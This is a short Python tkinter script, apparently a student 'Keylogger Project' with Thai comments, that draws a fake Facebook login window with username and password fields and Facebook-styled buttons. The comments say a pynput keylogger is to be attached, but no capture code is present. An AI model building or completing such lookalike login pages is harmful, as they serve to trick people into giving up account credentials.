""" KeyLogger Project """
""" เริ่ม 26/11/2563 13:22 """
""" แก้ไขล่าสุด : Veerawat [26/11/2563 13:22-17:31] """
""" ref pynput : https://pypi.org/project/pynput/ | ลง pip นี้โดย CMD > pip install pynput ***ต้องมีไฟล์ pynput ก่อน*** """
""" ref tkinter : https://www.tutorialsteacher.com/python/create-gui-using-tkinter-python """

""" สร้าง GUI โดย tkinter เพื่อนำ pynput keylogger มาประยุกต์ใช้ """
import tkinter as tk # import tkinter เพื่อสร้าง GUI
""" GUI """
window = tk.Tk() # สร้างตัวแปร
window.title('Keylogger Project'), window.geometry("800x600") # ชื่อและขนาด GUI
window.resizable(False, False) # ทำให้เปลี่ยนขนาดจอไม่ได้
""" ตำแหน่งรูปภาพ """
bg_image_loc = tk.PhotoImage(file="FacebookBG.png") # ใส่ภาพพื้นหลัง
""" สร้าง Widget """
bg_image = tk.Label(window, image=bg_image_loc) # Background บน GUI
username_box = tk.Entry(window, bd=0, font=('Helvetica', 14)) # Username box บน GUI
password_box = tk.Entry(window, show='*', bd=0, font=('Helvetica', 14)) # Password box บน GUI
login_btn = tk.Button(window, text='เข้าสู่ระบบ', bd=0, font=('Helvetica', 14, 'bold'), fg='white', bg='#1877F2', activebackground='#166FE5', activeforeground='white') # ปุ่ม Login
reg_btn = tk.Button(window, text='สร้างบัญชีใหม่', bd=0, font=('Helvetica', 14, 'bold'), fg='white', bg='#42B72A', activebackground='#36A420', activeforeground='white') # ปุ่ม Register
""" วาง Widget """
bg_image.place(x=0, y=0, relwidth=1, relheight=1) # วาง background บน GUI
username_box.place(x=465, y=127, width=285, height=40) # วาง Username box บน GUI
password_box.place(x=465, y=180, width=285, height=40) # วาง Password box บน GUI
login_btn.place(x=462, y=233, width=290, height=36) # วาง Login button บน GUI
reg_btn.place(x=547, y=339, width=120, height=36) # วาง Register button บน GUI
""" loop GUI """
window.mainloop()
